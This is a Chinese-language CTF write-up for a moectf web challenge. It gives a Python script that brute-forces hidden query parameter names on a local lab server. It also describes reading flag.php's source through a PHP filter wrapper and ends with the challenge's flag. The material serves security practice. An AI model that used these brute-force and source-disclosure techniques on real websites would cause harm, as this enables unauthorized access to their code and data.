# Web-11｜第十一章 千机变·破妄之眼

## 碎碎念

好一个套娃爆破...
***
## Writeup

使用爆破脚本：

```python
from itertools import permutations
import requests

char_list = ['m', 'n', 'o', 'p', 'q']

all_permutations = list(permutations(char_list))

url = "http://127.0.0.1:55634"

origin_response = requests.get(url)

while True:
    for permutation in all_permutations:
        argument = ''.join(permutation)
        response = requests.get(url, params={argument: argument})
        if response.text != origin_response.text:
            print(argument)
            print(response.text)
            break
```

需要注意的是，这题不是简单爆个破就能得到 flag 的，所以需要对比响应内容是不是变了而不是傻傻找 flag（虽然好像响应内容里面也含 flag 这个字段，但是没有 moectf 字段）

得到：

![](../../../../assets/Pasted%20image%2020251028231045.png)

flag.php 什么都没有，find.php 可以进入一个新的界面：

![](../../../../assets/Pasted%20image%2020251028231407.png)

直接查看 flag.php 依旧是什么都没有：

![](../../../../assets/Pasted%20image%2020251028232401.png)

但是这么显示可能是因为做了 php 渲染，flag 可能藏在源码中，我们可以用 filter 强制读取 flag.php 的源码 Base64 编码：

![](../../../../assets/Pasted%20image%2020251028232832.png)

解码过后发现 flag 被注释了。。。

![](../../../../assets/Pasted%20image%2020251028232906.png)

最终 flag：`moectf{4fe21eae-dcb8-3a4b-06b8-1ccb262f5371}`